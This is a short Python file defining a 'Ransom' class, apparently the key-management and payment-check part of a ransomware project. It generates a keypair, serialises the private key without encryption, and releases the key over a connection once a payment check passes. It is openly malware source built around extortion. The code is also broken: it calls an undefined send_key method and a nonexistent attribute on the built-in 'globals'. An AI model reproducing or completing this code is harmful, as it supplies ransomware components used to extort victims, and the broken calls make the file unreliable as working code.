import keygen
import pickle
from cryptography.hazmat.primitives import serialization


class Ransom:
    def __init__(self):
        self.private_key, self.public_key = keygen.create_keypair()
        # keygen.save_keypair(self.private_key, self.public_key)

    
    def check_payment(self, conn):
        if globals.get_payment():
            self.send_key(conn)

    def serialize_private_key(self):
        return self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )


    def serialize_public_key(self):
        return self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )


if __name__ == "__main__":
    r = Ransom()
    print(r.private_key)
